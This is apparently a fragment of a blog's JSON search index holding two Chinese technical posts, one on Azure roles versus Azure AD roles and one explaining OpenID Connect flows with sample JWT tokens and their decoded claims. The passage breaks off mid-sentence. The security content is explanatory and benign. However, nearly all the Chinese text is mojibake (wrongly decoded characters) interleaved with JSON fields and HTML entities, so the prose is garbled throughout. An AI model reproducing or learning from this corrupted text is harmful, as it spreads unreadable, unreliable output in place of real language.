åˆ›å»ºå’Œç®¡ç†ç”¨æˆ·ä¸ç»„çš„æ‰€æœ‰æ–¹é¢ç®¡ç†æ”¯æŒç¥¨è¯ç›‘è§†æœåŠ¡è¿è¡ŒçŠ¶å†µæ›´æ”¹ç”¨æˆ·ã€æ”¯æŒç®¡ç†å‘˜å’Œå…¶ä»–ç”¨æˆ·å¸æˆ·ç®¡ç†å‘˜çš„å¯†ç  è®¡è´¹ç®¡ç†å‘˜ è´­ä¹°äº§å“ç®¡ç†è®¢é˜…ç®¡ç†æ”¯æŒç¥¨è¯ç›‘è§†æœåŠ¡è¿è¡ŒçŠ¶å†µ åœ¨ Azure é—¨æˆ·ä¸­çš„â€œè§’è‰²å’Œç®¡ç†å‘˜â€è¾¹æ é€‰é¡¹å¡ä¸Šï¼Œå¯ä»¥çœ‹åˆ° Azure AD è§’è‰²çš„åˆ—è¡¨ã€‚ æœ‰å…³æ‰€æœ‰ Azure AD è§’è‰²çš„åˆ—è¡¨ï¼Œè¯·å‚é˜… Azure Active Directory ä¸­çš„ç®¡ç†å‘˜è§’è‰²æƒé™ã€‚ Azure è§’è‰²ä¸ Azure AD è§’è‰²ä¹‹é—´çš„å·®åˆ« ä»è¾ƒé«˜å±‚é¢è®²ï¼ŒAzure è§’è‰²æ§åˆ¶ Azure èµ„æºçš„ç®¡ç†æƒé™ï¼Œè€Œ Azure AD è§’è‰²æ§åˆ¶ Azure Active Directory èµ„æºçš„ç®¡ç†æƒé™ã€‚ ä¸‹è¡¨æ¯”è¾ƒäº†ä¸¤è€…ä¹‹é—´çš„ä¸€äº›å·®åˆ«ã€‚ Azure è§’è‰² Azure AD è§’è‰² ç®¡ç†å¯¹ Azure èµ„æºçš„è®¿é—® ç®¡ç†å¯¹ Azure Active Directory èµ„æºçš„è®¿é—® æ”¯æŒè‡ªå®šä¹‰è§’è‰² æ”¯æŒè‡ªå®šä¹‰è§’è‰² å¯åœ¨å¤šä¸ªçº§åˆ«ï¼ˆç®¡ç†ç»„ã€è®¢é˜…ã€èµ„æºç»„ã€èµ„æºï¼‰æŒ‡å®šèŒƒå›´ èŒƒå›´å¯ä»¥åœ¨ç§Ÿæˆ·çº§åˆ«ï¼ˆç»„ç»‡èŒƒå›´ï¼‰ã€ç®¡ç†å•å…ƒæˆ–å•ä¸ªå¯¹è±¡ï¼ˆä¾‹å¦‚ï¼Œç‰¹å®šåº”ç”¨ç¨‹åºï¼‰ä¸ŠæŒ‡å®š å¯åœ¨ Azure é—¨æˆ·ã€Azure CLIã€Azure PowerShellã€Azure èµ„æºç®¡ç†å™¨æ¨¡æ¿ã€REST API ä¸­è®¿é—®è§’è‰²ä¿¡æ¯ å¯åœ¨ Azure ç®¡ç†é—¨æˆ·ã€Microsoft 365 ç®¡ç†ä¸­å¿ƒã€Microsoft Graphã€AzureAD PowerShell ä¸­è®¿é—®è§’è‰²ä¿¡æ¯ Azure è§’è‰²ä¸ Azure AD è§’è‰²æ˜¯å¦é‡å ï¼Ÿ é»˜è®¤æƒ…å†µä¸‹ï¼ŒAzure è§’è‰²ä¸ Azure AD è§’è‰²ä¸ä¼šè·¨è¶Š Azure ä¸ Azure ADã€‚ ä½†æ˜¯ï¼Œå¦‚æœå…¨å±€ç®¡ç†å‘˜é€šè¿‡åœ¨ Azure é—¨æˆ·ä¸­é€‰æ‹©â€œAzure èµ„æºçš„è®¿é—®ç®¡ç†â€å¼€å…³ï¼Œæå‡äº†è‡ªå·±çš„è®¿é—®æƒé™ï¼Œåˆ™ä¼šé’ˆå¯¹ç‰¹å®šç§Ÿæˆ·çš„æ‰€æœ‰è®¢é˜…ä¸ºå…¨å±€ç®¡ç†å‘˜æˆäºˆç”¨æˆ·è®¿é—®ç®¡ç†å‘˜è§’è‰²ï¼ˆAzure è§’è‰²ï¼‰ã€‚ â€œç”¨æˆ·è®¿é—®ç®¡ç†å‘˜â€è§’è‰²å…è®¸ç”¨æˆ·å‘å…¶ä»–ç”¨æˆ·æˆäºˆå¯¹ Azure èµ„æºçš„è®¿é—®æƒé™ã€‚ æ­¤å¼€å…³å¯å¸®åŠ©é‡æ–°è·å–è®¢é˜…çš„è®¿é—®æƒé™ã€‚ æœ‰å…³è¯¦ç»†ä¿¡æ¯ï¼Œè¯·å‚é˜…æå‡è®¿é—®æƒé™ä»¥ç®¡ç†æ‰€æœ‰ Azure è®¢é˜…å’Œç®¡ç†ç»„ã€‚ æœ‰å¤šä¸ª Azure AD è§’è‰²ï¼ˆä¾‹å¦‚å…¨å±€ç®¡ç†å‘˜å’Œç”¨æˆ·ç®¡ç†å‘˜è§’è‰²ï¼‰å¯è·¨è¶Š Azure AD å’Œ Microsoft 365ã€‚ ä¾‹å¦‚ï¼Œå¦‚æœä½ æ˜¯å…¨å±€ç®¡ç†å‘˜è§’è‰²çš„æˆå‘˜ï¼Œåˆ™ä¼šè·å¾— Azure AD å’Œ Microsoft 365 ä¸­çš„å…¨å±€ç®¡ç†å‘˜åŠŸèƒ½ï¼Œä¾‹å¦‚ï¼Œå¯¹ Microsoft Exchange å’Œ Microsoft SharePoint è¿›è¡Œæ›´æ”¹ã€‚ ä½†æ˜¯ï¼Œåœ¨é»˜è®¤æƒ…å†µä¸‹ï¼Œå…¨å±€ç®¡ç†å‘˜æ— æƒè®¿é—® Azure èµ„æºã€‚","categories":[{"name":"æŠ€æœ¯å‘","slug":"æŠ€æœ¯å‘","permalink":"https://www.sizaif.com/navigation/categories/%E6%8A%80%E6%9C%AF%E5%90%91/"},{"name":"Azure","slug":"æŠ€æœ¯å‘/Azure","permalink":"https://www.sizaif.com/navigation/categories/%E6%8A%80%E6%9C%AF%E5%90%91/Azure/"}],"tags":[{"name":"Azure","slug":"Azure","permalink":"https://www.sizaif.com/tags/Azure/"},{"name":"å¾®è½¯","slug":"å¾®è½¯","permalink":"https://www.sizaif.com/tags/%E5%BE%AE%E8%BD%AF/"}],"author":"sizaif"},{"title":"ä»€ä¹ˆæ˜¯OIDC(OpenID Connect)","slug":"ä»€ä¹ˆæ˜¯OIDC-OpenID-Connect","date":"2021-12-19T07:31:38.000Z","updated":"2021-12-22T07:50:06.591Z","comments":true,"path":"posts/de08e406/","link":"","permalink":"https://www.sizaif.com/posts/de08e406/","excerpt":"","text":"ä»€ä¹ˆæ˜¯ OIDCï¼Ÿ OIDC çš„å…¨ç§°æ˜¯ OpenID Connectï¼Œæ˜¯ä¸€å¥—åŸºäº OAuth 2.0 çš„è®¤è¯ + æˆæƒåè®®ï¼Œç”¨äºç”¨æˆ·èº«ä»½è®¤è¯ï¼Œå°†ç”¨æˆ·æ•°æ®å®‰å…¨åœ°æš´éœ²ç»™ç¬¬ä¸‰æ–¹ã€‚ OIDC ä¸ OAuth 2.0 æœ‰ä½•ä¸åŒï¼Ÿ OAuth 2.0 æ˜¯ç”¨äºæˆæƒçš„è¡Œä¸šæ ‡å‡†åè®®ã€‚OAuth 2.0 è‡´åŠ›äºç®€åŒ–å®¢æˆ·ç«¯å¼€å‘äººå‘˜çš„å·¥ä½œï¼ŒåŒæ—¶ä¸ºWeb åº”ç”¨ç¨‹åºï¼Œæ¡Œé¢åº”ç”¨ç¨‹åºï¼Œç§»åŠ¨ç”µè¯å’Œç‰©è”ç½‘è®¾å¤‡æä¾›ç‰¹å®šçš„æˆæƒæµç¨‹ã€‚ ä»¥ä¸Šæ˜¯ OAuth 2.0 çš„å®˜æ–¹å®šä¹‰ã€‚æˆ‘ä»¬ä¸¾ä¸€ä¸ªå®é™…çš„ä¾‹å­ï¼Œä½ åœ¨ç™»å½•äº¬ä¸œçš„æ—¶å€™ï¼Œä¼šå‘ç°åœ¨äº¬ä¸œçš„ç™»å½•æ¡†ä¸­æœ‰ä½¿ç”¨ QQ ç™»å½•ã€ä½¿ç”¨ QQ ç™»å½•çš„æŒ‰é’®ï¼Œè¿™äº›åœ°æ–¹å°±æ˜¯ OAuth 2.0 åè®®çš„ç”¨æ­¦ä¹‹åœ°ã€‚äº¬ä¸œå¸Œæœ›ä» QQ è·å–ä½ çš„ QQ ç”¨æˆ·æ•°æ®ï¼Œä»è€Œå®Œæˆåœ¨äº¬ä¸œçš„æ³¨å†Œï¼Œè¿™å°±éœ€è¦æ•°æ®çš„ä¸»äººâ€”â€”ä½ çš„æˆæƒã€‚å®Œæˆæˆæƒä¹‹åï¼Œ QQ ä¼šç»™äº¬ä¸œä¸€ä¸ª access_tokenï¼Œäº¬ä¸œæºå¸¦è¿™ä¸ªå‡­è¯ï¼Œå°±èƒ½ä»¥ä½ çš„åä¹‰ï¼Œä»¥åŠä½ æˆäºˆæ­¤ç½‘ç«™çš„æƒé™ï¼ˆä¾‹å¦‚ä½ æˆæƒäº¬ä¸œèƒ½å¤Ÿè®¿é—®ä½ çš„ä¸ªäººä¿¡æ¯è€Œä¸æ˜¯è½¬è´¦èƒ½åŠ›ï¼‰ï¼Œè®¿é—®ä½ åœ¨ QQ æœåŠ¡å™¨ä¸Šçš„æ•°æ®ï¼Œä»è€Œè·å–ä½ çš„ä¿¡æ¯ï¼Œåœ¨æ­¤è¿‡ç¨‹ä¸­ï¼Œä½ æ— é¡»å‘Šè¯‰äº¬ä¸œä½ çš„ QQ è´¦å·å’Œå¯†ç ï¼Œä½ è¾“å…¥è´¦å¯†ä¿¡æ¯çš„æ—¶å€™ï¼Œæ˜¯åœ¨è…¾è®¯çš„æœåŠ¡å™¨å®Œæˆçš„è®¤è¯ã€‚ OIDC ä¸ OAuth 2.0 ç›¸æ¯”ï¼Œå¤šäº†è®¤è¯çš„èƒ½åŠ›ã€‚ä¸ä½†èƒ½å¤Ÿè¿”å›ç”¨æˆ·çš„ access_tokenï¼Œè®©ç¬¬ä¸‰æ–¹é€šè¿‡ access_token è°ƒç”¨ç”¨æˆ·æˆæƒè¿‡çš„æ¥å£ï¼ˆç”¨æˆ·æˆæƒï¼‰ï¼Œè¿˜å¯ä»¥è¿”å›ç”¨æˆ·çš„ id_tokenï¼Œç¬¬ä¸‰æ–¹å¯ä»¥å°† id_token ç”¨ä½œç”¨æˆ·èº«ä»½æ ‡è¯†ï¼ˆç”¨æˆ·è®¤è¯ï¼‰ã€‚ å›åˆ°åˆšæ‰çš„ä¾‹å­ï¼Œäº¬ä¸œè·å–åˆ° QQ é¢å‘çš„ access_tokenï¼ˆæ˜¯ä¸€ä¸ªéšæœºå­—ç¬¦ä¸²ï¼‰ä¹‹åç¡®å®èƒ½å¤Ÿè·å–åˆ°ä½ çš„ä¿¡æ¯ï¼Œä½†æ˜¯å¦‚æœä¸å€ŸåŠ©å…¶ä»–æ‰‹æ®µï¼Œæ˜¯ä¸å…·å¤‡ç”¨æˆ·èº«ä»½è®¤è¯åŠŸèƒ½çš„ã€‚è€Œåœ¨ OIDC åè®®ä¸­ï¼Œè·å– access_token çš„åŒæ—¶ï¼Œä¼šè¿”å›ä¸€ä¸ª JWT æ ¼å¼çš„ id_tokenï¼Œå¯ç›´æ¥ç”¨ä½œèº«ä»½æ ‡è¯†ï¼Œä¾›ç¬¬ä¸‰æ–¹ç¡®è®¤ç”¨æˆ·èº«ä»½ã€‚ JWT Token æ˜¯è¿™ä¸ªæ ·å­çš„ï¼š eyJ0eXAiOiJKV1QiLA0KICJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJqb2UiLA0KICJleHAiOjEzMDA4MTkzODAsDQogImh0dHA6Ly9leGFtcGxlLmNvbS9pc19yb290Ijp0cnVlfQ.dBjftJeZ4CVP-mB92K27uhbUJU1p1r_wW1gFWFOEjXk æ ¼å¼ä¸ºâ€œç‚¹åˆ† base64 ç¼–ç â€ï¼Œä¸€å…±ä¸‰æ®µï¼Œç¬¬ä¸€éƒ¨åˆ†å«ä½œå¤´éƒ¨ï¼ˆJOSE Headerï¼‰ï¼Œç¬¬äºŒéƒ¨åˆ†å«ä½œè·è½½ï¼ˆPayloadï¼‰ï¼Œç¬¬ä¸‰éƒ¨åˆ†å«ä½œç­¾åï¼ˆSignatureï¼‰ã€‚å…¶ä¸­çš„ç­¾åæ ¹æ®å¤´éƒ¨ã€è·è½½å’Œä¸€ä¸ªå¯†é’¥è®¡ç®—å¾—å‡ºï¼Œä¸å¯ä¼ªé€ ã€‚ base64 è§£ç ä¹‹åæ˜¯è¿™æ ·å­çš„ï¼š &#123;\"typ\":\"JWT\", \"alg\":\"HS256\"&#125;.&#123;\"iss\":\"joe\", \"exp\":1300819380, \"http://example.com/is_root\":true&#125;.&lt;ç­¾å> æ€»ç»“æˆä¸€å¥è¯ï¼šOAuth 2.0 èƒ½åšçš„ OIDC éƒ½èƒ½åšï¼ŒOAuth 2.0 ä¸å…·å¤‡çš„è®¤è¯èƒ½åŠ›ï¼ŒOIDC ä¹Ÿå…·å¤‡ã€‚ OIDC åè®®çš„åº”ç”¨åœºæ™¯ æ‰€æœ‰ä½¿ç”¨ OAuth 2.0 çš„åœºæ™¯éƒ½å¯ä»¥å‡çº§ä¸º OIDC åè®®ï¼ŒOIDC åè®®æ˜¯ OAuth 2.0 çš„è¶…é›†ã€‚ä»¥ä¸‹æ˜¯ä¸€äº› OIDC åè®®çš„åº”ç”¨åœºæ™¯ï¼š ç¤¾ä¼šåŒ–ç™»å½•åœºæ™¯ï¼Œç½‘ç«™ç™»å½•æ¡†ä¸Šå¸¸è§è®¸å¤šæŒ‰é’®ã€Œä½¿ç”¨ XXX ç™»å½•ã€ã€‚ ç‰©è”ç½‘è®¾å¤‡çš„èº«ä»½è®¤è¯å’Œæˆæƒã€‚ ä¼ä¸šå†…å¤šä¸ªåº”ç”¨ç»Ÿä¸€èº«ä»½ï¼Œå•ç‚¹ç™»å½•ã€‚ å¼€æ”¾å¹³å°å¯¹å¤–æš´éœ²åº”ç”¨æ•°æ®ï¼Œåšç”¨æˆ·è®¤è¯ä¸æˆæƒã€‚ Serverless ä¸­çš„èº«ä»½å±‚ã€‚ OIDC åè®®æ˜¯ OAuth 2.0 åè®®çš„ä¸‹ä¸€ä»£ï¼Œæ˜¯èº«ä»½è®¤è¯åè®®å‡çº§çš„ä¸äºŒä¹‹é€‰ã€‚ OIDC åè®®ä¸­çš„å››ä¸ªä¸»ä½“ åœ¨ä»‹ç» OIDC æˆæƒæ¨¡å¼ä¹‹å‰ï¼Œå…ˆè¦æ˜ç¡®å››ä¸ªä¸»ä½“ï¼šç¬¬ä¸‰æ–¹åº”ç”¨ã€èµ„æºæœåŠ¡å™¨ã€èµ„æºæ‰€æœ‰è€…ã€è®¤è¯æˆæƒæœåŠ¡å™¨ã€‚æˆ‘ä»¬ç»§ç»­æ²¿ç”¨å‰æ–‡äº¬ä¸œä¸ QQ ç™»å½•çš„ä¾‹å­ã€‚ P.S. QQ ä½¿ç”¨çš„æ˜¯å˜ç§ OAuth 2.0 åè®®ï¼Œå¹¶ä¸å®Œå…¨ç¬¦åˆ OIDC è§„èŒƒï¼Œåœ¨æ­¤å‡è®¾ QQ ä½¿ç”¨ OIDC åè®®è¿›è¡Œå¯¹å¤–æ•°æ®æˆæƒã€‚ ç¬¬ä¸‰æ–¹åº”ç”¨ äº¬ä¸œçš„è§’è‰²æ˜¯ç¬¬ä¸‰æ–¹åº”ç”¨ã€‚ èµ„æºæœåŠ¡å™¨ QQ çš„ä¸ªäººä¿¡æ¯å­˜æ”¾äºèµ„æºæœåŠ¡å™¨ã€‚ èµ„æºæ‰€æœ‰è€… ç”¨æˆ·æ˜¯ QQ è´¦å·çš„æ‰€æœ‰è€…ã€‚ è®¤è¯æˆæƒæœåŠ¡å™¨ QQ çš„æˆæƒæœåŠ¡å™¨è´Ÿè´£ç”¨æˆ·çš„èº«ä»½è®¤è¯å’Œæˆæƒï¼Œç®¡ç†ç¬¬ä¸‰æ–¹åº”ç”¨ã€å—ä¿æŠ¤èµ„æºã€èµ„æºæ‰€æœ‰è€…ä¹‹é—´çš„å…³ç³»ã€‚ OIDC çš„ä¸‰ç§æˆæƒæ¨¡å¼ Authorization Code Flow åº”ç”¨æœ€ä¸ºå¹¿æ³›çš„æ˜¯æˆæƒç æ¨¡å¼ï¼Œæ­¤æ¨¡å¼çš„äº¤äº’è¿‡ç¨‹å¦‚ä¸‹å›¾**ï¼š** ç¬¬ä¸‰æ–¹åº”ç”¨è®¿é—®è®¤è¯æœåŠ¡å™¨çš„æˆæƒé“¾æ¥ã€‚ï¼ˆç”¨æˆ·åœ¨äº¬ä¸œç½‘ç«™ç™»å½•æ¡†ç‚¹å‡»ä½¿ç”¨ QQ ç™»å½•ï¼‰ ç”¨æˆ·ä¸è®¤è¯æœåŠ¡å™¨å®Œæˆèº«ä»½è®¤è¯ã€‚ï¼ˆæµè§ˆå™¨è·³è½¬åˆ° QQ æˆæƒé¡µé¢ï¼Œç”¨æˆ·è¾“å…¥ QQ å·å’Œå¯†ç ï¼‰ è®¤è¯æœåŠ¡å™¨å‘ç¬¬ä¸‰æ–¹åº”ç”¨è¿”å›æˆæƒç  codeã€‚ï¼ˆQQ æœåŠ¡å™¨å°†ç”¨æˆ·çš„æµè§ˆå™¨é‡å®šå‘ï¼Œå°†æˆæƒç å‘é€åˆ°äº¬ä¸œæœåŠ¡å™¨ï¼‰ ç¬¬ä¸‰æ–¹åº”ç”¨æºå¸¦æˆæƒç è®¿é—®è®¤è¯æœåŠ¡å™¨çš„ token æ¥å£ã€‚ï¼ˆäº¬ä¸œæœåŠ¡å™¨æºå¸¦æˆæƒç ä¸ QQ æœåŠ¡å™¨äº¤äº’ï¼‰ è®¤è¯æœåŠ¡å™¨è¿”å› access_token å’Œ id_token ç»™ç¬¬ä¸‰æ–¹åº”ç”¨ã€‚ï¼ˆQQ æœåŠ¡å™¨è¿”å› access_token å’Œ id_token ç»™äº¬ä¸œæœåŠ¡å™¨ï¼‰ æ­¤åï¼Œç¬¬ä¸‰æ–¹åº”ç”¨å¯ä»¥åˆ©ç”¨ access_token åˆ°èµ„æºæœåŠ¡å™¨è·å–ç”¨æˆ·çš„ä¿¡æ¯ï¼Œå®Œæˆåœ¨ç¬¬ä¸‰æ–¹åº”ç”¨çš„æ³¨å†Œå’Œç™»å½•ä¸šåŠ¡ï¼Œå¹¶å¯ä»¥å°† id_token ä½œä¸ºç”¨æˆ·çš„èº«ä»½å‡­è¯ï¼Œå­˜æ”¾åœ¨å‰ç«¯ã€‚ç¬¬ä¸‰æ–¹åº”ç”¨çš„å‰ç«¯éœ€è¦è®¿é—®å—ä¿æŠ¤çš„èµ„æºï¼ˆä¾‹å¦‚ç”¨æˆ·è´¦å•ä¿¡æ¯ã€è´­ç‰©è½¦ï¼‰æ—¶éœ€è¦æºå¸¦ id_tokenï¼Œåç«¯éªŒè¯ id_token åˆæ³•æ€§ï¼Œæ ¸å®ç”¨æˆ·èº«ä»½ä¹‹åï¼Œè¿”å›ç›¸å…³èµ„æºæ•°æ®ã€‚ OIDC è®¤è¯æ—¶ç›¸å…³ Token è§£é‡Š OIDC è®¤è¯æ—¶ä¼šç­¾å‘ä¸¤ç§ Tokenï¼Œä¸€ç±»å« id_tokenï¼Œè¿˜æœ‰ä¸€ç±»å« access_tokenã€‚ id_token æ˜¯ç”¨æˆ·èº«ä»½çš„å‡­è¯ï¼Œåªèµ·åˆ°åˆ¤å®šç”¨æˆ·èº«ä»½çš„ä½œç”¨ã€‚ id_token ç¤ºä¾‹ï¼š eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiI1ZTQ5NjBkZmJkOTE1OGZiODQ0OTAzYTkiLCJiaXJ0aGRhdGUiOiIiLCJmYW1pbHlfbmFtZSI6IiIsImdlbmRlciI6IiIsImdpdmVuX25hbWUiOiIiLCJsb2NhbGUiOiIiLCJtaWRkbGVfbmFtZSI6IiIsIm5hbWUiOiIiLCJuaWNrbmFtZSI6IiIsInBpY3R1cmUiOiJodHRwczovL3VzZXJjb250ZW50cy5hdXRoaW5nLmNuL2F1dGhpbmctYXZhdGFyLnBuZyIsInByZWZlcnJlZF91c2VybmFtZSI6IiIsInByb2ZpbGUiOiIiLCJ1cGRhdGVkX2F0IjoiIiwid2Vic2l0ZSI6IiIsInpvbmVpbmZvIjoiIiwiY29tcGFueSI6IiIsImJyb3dzZXIiOiJNb3ppbGxhLzUuMCAoTWFjaW50b3NoOyBJbnRlbCBNYWMgT1MgWCAxMF8xNF82KSBBcHBsZVdlYktpdC81MzcuMzYgKEtIVE1MLCBsaWtlIEdlY2tvKSBDaHJvbWUvODAuMC4zOTg3Ljg3IFNhZmFyaS81MzcuMzYiLCJkZXZpY2UiOiIiLCJsb2dpbnNfY291bnQiOjEsInJlZ2lzdGVyX21ldGhvZCI6ImRlZmF1bHQ6dXNlcm5hbWUtcGFzc3dvcmQiLCJibG9ja2VkIjpmYWxzZSwibGFzdF9pcCI6IjEyMS4yMS41Ni4xNzEiLCJyZWdpc3Rlcl9pbl91c2VycG9vbCI6IjVjOTU5MDU1NzhmY2U1MDAwMTY2Zjg1MyIsImxhc3RfbG9naW4iOiIyMDIwLTAyLTE2VDE1OjMzOjUyLjQ0NFoiLCJzaWduZWRfdXAiOiIyMDIwLTAyLTE2VDE1OjMzOjUxLjY2NVoiLCJlbWFpbCI6InRlc3QxQDEyMy5jb20iLCJlbWFpbF92ZXJpZmllZCI6ZmFsc2UsInBob25lX251bWJlciI6IiIsInBob25lX251bWJlcl92ZXJpZmllZCI6ZmFsc2UsImF0X2hhc2giOiJWYW9sSnVqWXltQjUxNlNGOGNaQkpBIiwic2lkIjoiZGYzMGFlNDgtOTkzMS00YjZlLWI0YzgtMWI5NjRkOGZjOWIyIiwiYXVkIjoiNWQwMWUzODk5ODVmODFjNmMxZGQzMWRlIiwiZXhwIjoxNTgxODcwOTc4LCJpYXQiOjE1ODE4NjczODEsImlzcyI6Imh0dHBzOi8vb2F1dGguYXV0aGluZy5jbi9vYXV0aC9vaWRjIn0.pH-bWm-Im0wnOcUEA-OG_iKwy9DTZlAXuik50HPsfGY â€‹ è§£ç åï¼š &#123; &quot;alg&quot;: &quot;HS256&quot;, &quot;typ&quot;: &quot;JWT&quot;&#125;.&#123; &quot;sub&quot;: &quot;5e3a3b2315a0b8398cdaaa08&quot;, &quot;birthdate&quot;: &quot;&quot;, &quot;family_name&quot;: &quot;&quot;, &quot;gender&quot;: &quot;&quot;, &quot;given_name&quot;: &quot;&quot;, &quot;locale&quot;: &quot;&quot;, &quot;middle_name&quot;: &quot;&quot;, &quot;name&quot;: &quot;&quot;, &quot;nickname&quot;: &quot;&quot;, &quot;picture&quot;: &quot;https:&#x2F;&#x2F;usercontents.authing.cn&#x2F;authing-avatar.png&quot;, &quot;preferred_username&quot;: &quot;&quot;, &quot;profile&quot;: &quot;&quot;, &quot;updated_at&quot;: &quot;&quot;, &quot;website&quot;: &quot;&quot;, &quot;zoneinfo&quot;: &quot;&quot;, &quot;company&quot;: &quot;&quot;, &quot;browser&quot;: &quot;&quot;, &quot;device&quot;: &quot;&quot;, &quot;logins_count&quot;: 8, &quot;register_method&quot;: &quot;default:username-password&quot;, &quot;blocked&quot;: false, &quot;last_ip&quot;: &quot;127.0.0.1&quot;, &quot;register_in_userpool&quot;: &quot;5e3a3b2315a0b8398cdaaa04&quot;, &quot;last_login&quot;: &quot;2020-02-16T09:04:09.764Z&quot;, &quot;signed_up&quot;: &quot;2020-02-05T03:48:51.447Z&quot;, &quot;email&quot;: &quot;test@test.com&quot;, &quot;email_verified&quot;: false, &quot;phone_number&quot;: &quot;&quot;, &quot;at_hash&quot;: &quot;6k-IWJwh-Dd3_hLOay0s7A&quot;, &quot;sid&quot;: &quot;d50a8c9d-23db-4156-80ea-1c82d199d0e9&quot;, &quot;aud&quot;: &quot;5e3a3b2315a0b8398cdaaa0e&quot;, &quot;exp&quot;: 1581948533, &quot;iat&quot;: 1581944933, &quot;iss&quot;: &quot;https:&#x2F;&#x2F;core.littleimp.cn&#x2F;oauth&#x2F;oidc&quot;&#125;.ç­¾å access_token æ˜¯ç”¨æˆ·æˆæƒç»™ç¬¬ä¸‰æ–¹åº”ç”¨çš„ä¸€ä¸ªä»¤ç‰Œï¼Œç¬¬ä¸‰æ–¹åº”ç”¨å¯ä»¥ä½¿ç”¨è¿™ä¸ªä»¤ç‰Œè®¿é—®ç”¨æˆ·åœ¨èµ„æºæœåŠ¡å™¨ä¸Šå—ä¿æŠ¤çš„èµ„æºï¼Œä¸€èˆ¬ä¸ç”¨äºç”¨æˆ·å‡­è¯å’Œèº«ä»½æ ‡è¯†ã€‚ â€‹ access_token ç¤ºä¾‹ï¼š eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJqdGkiOiJXaXdndEdHYzVMeGtZRUFRY012RFkiLCJzdWIiOiI1ZTNhM2IyMzE1YTBiODM5OGNkYWFhMDgiLCJpc3MiOiJodHRwczovL2NvcmUubGl0dGxlaW1wLmNuL29hdXRoL29pZGMiLCJpYXQiOjE1ODE5NDQ5MzMsImV4cCI6MTU4MTk0ODUzMywic2NvcGUiOiJvcGVuaWQgcHJvZmlsZSBlbWFpbCBwaG9uZSIsImF1ZCI6IjVlM2EzYjIzMTVhMGI4Mzk4Y2RhYWEwZSJ9.MnAAGj6HlYvN3FOAo6PA2cxNxZDZbL3yhxTM3uxnt0M è§£ç åï¼š &#123; &quot;alg&quot;: &quot;HS256&quot;, &quot;typ&quot;: &quot;JWT&quot;&#125;.&#123; &quot;jti&quot;: &quot;WiwgtGGc5LxkYEAQcMvDY&quot;, &quot;sub&quot;: &quot;5e3a3b2315a0b8398cdaaa08&quot;, &quot;iss&quot;: &quot;https://core.littleimp.cn/oauth/oidc&quot;, &quot;iat&quot;: 1581944933, &quot;exp&quot;: 1581948533, &quot;scope&quot;: &quot;openid profile email phone&quot;, &quot;aud&quot;: &quot;5e3a3b2315a0b8398cdaaa0e&quot;&#125;.ç­¾å Implicit Flow åœ¨éšå¼æ¨¡å¼ä¸­ï¼Œè®¤è¯æœåŠ¡å™¨çš„æˆæƒæ¥å£ä¸ä¼šè¿”å›æˆæƒç  codeï¼Œè€Œæ˜¯åœ¨ä¸ç”¨æˆ·å®Œæˆè®¤è¯åè¿”å› id_token å’Œ access_tokenï¼Œäº¤äº’æ¨¡å¼å¦‚ä¸‹å›¾æ‰€ç¤ºï¼š ç¬¬ä¸‰æ–¹åº”ç”¨è®¿é—®è®¤è¯æœåŠ¡å™¨çš„æˆæƒé“¾æ¥ã€‚ï¼ˆç”¨æˆ·åœ¨äº¬ä¸œç½‘ç«™ç™»å½•æ¡†ç‚¹å‡»ä½¿ç”¨ QQ ç™»å½•ï¼‰ ç”¨æˆ·ä¸è®¤è¯æœåŠ¡å™¨å®Œæˆèº«ä»½è®¤è¯ã€‚ï¼ˆæµè§ˆå™¨è·³è½¬åˆ° QQ æˆæƒé¡µé¢ï¼Œç”¨æˆ·è¾“å…¥ QQ å·å’Œå¯†ç ï¼‰ è®¤è¯æœåŠ¡å™¨å‘ç¬¬ä¸‰æ–¹åº”ç”¨è¿”å› id_token å’Œ access_tokenã€‚ï¼ˆQQ æœåŠ¡å™¨å°†ç”¨æˆ·çš„æµè§ˆå™¨é‡å®šå‘ï¼Œå°† id_token access_token å‘é€åˆ°äº¬ä¸œå‰ç«¯é¡µé¢ï¼‰ éšå¼æ¨¡å¼æ¯”æˆæƒç æ¨¡å¼ç®€å•ï¼Œç»å¸¸ç”¨äºå°† id_tokenã€access_token ç›´æ¥è¿”å›åˆ°å‰ç«¯ï¼Œæ–¹ä¾¿å‰ç«¯ç›´æ¥å­˜å‚¨ id_token ç”¨äºè¯æ˜ç”¨æˆ·èº«ä»½ã€‚ä¹Ÿéœ€è¦å‰ç«¯è‡ªè¡Œå°† access_token å‘å›åç«¯ï¼Œåç«¯ç”¨äºè·å–ç”¨æˆ·çš„è¯¦ç»†ä¿¡æ¯ï¼Œè¿™å¢åŠ äº†æš´éœ² access_token çš„é£é™©ã€‚éšå¼æ¨¡å¼ä¸æ”¯æŒè¿”å› refresh_tokenï¼Œå³ä¸èƒ½ä»åç«¯åˆ·æ–° access_tokenï¼Œç™»å½•ä¸€æ—¦è¿‡æœŸéœ€è¦ç”¨æˆ·é‡æ–°ç™»å½•ã€‚ Hybrid Flow æ··åˆæ¨¡å¼æ˜¯ä»¥ä¸Šä¸¤ç§æ¨¡å¼çš„ç»„åˆï¼Œç‰¹ç‚¹æ˜¯èƒ½å¤Ÿåœ¨æˆæƒæ¥å£ä¸€æ¬¡æ€§è·å–åˆ° codeã€id_tokenã€access_tokenï¼Œä¸€èˆ¬ code ä¼šä¸ id_tokenã€access_token æ··åˆå‡ºç°ï¼Œæ··åˆæ¨¡å¼çš„äº¤äº’å¦‚ä¸‹å›¾æ‰€ç¤ºï¼š ç¬¬ä¸‰æ–¹åº”ç”¨è®¿é—®è®¤è¯æœåŠ¡å™¨çš„æˆæƒé“¾æ¥ã€‚ï¼ˆç”¨æˆ·åœ¨äº¬ä¸œç½‘ç«™ç™»å½•æ¡†ç‚¹å‡»ä½¿ç”¨ QQ ç™»å½•ï¼‰ ç”¨æˆ·ä¸è®¤è¯æœåŠ¡å™¨å®Œæˆèº«ä»½è®¤è¯ã€‚ï¼ˆæµè§ˆå™¨è·³è½¬åˆ° QQ æˆæƒé¡µé¢ï¼Œç”¨æˆ·è¾“å…¥ QQ å·å’Œå¯†ç ï¼‰ è®¤è¯æœåŠ¡å™¨å‘ç¬¬ä¸‰æ–¹åº”ç”¨è¿”å› codeã€id_token å’Œ access_tokenã€‚ï¼ˆQQ æœåŠ¡å™¨å°†ç”¨æˆ·çš„æµè§ˆå™¨é‡å®šå‘ï¼Œå°† id_token access_token å‘é€åˆ°äº¬ä¸œå‰ç«¯é¡µé¢ï¼‰ ç¬¬ä¸‰æ–¹åº”ç”¨æºå¸¦æˆæƒç 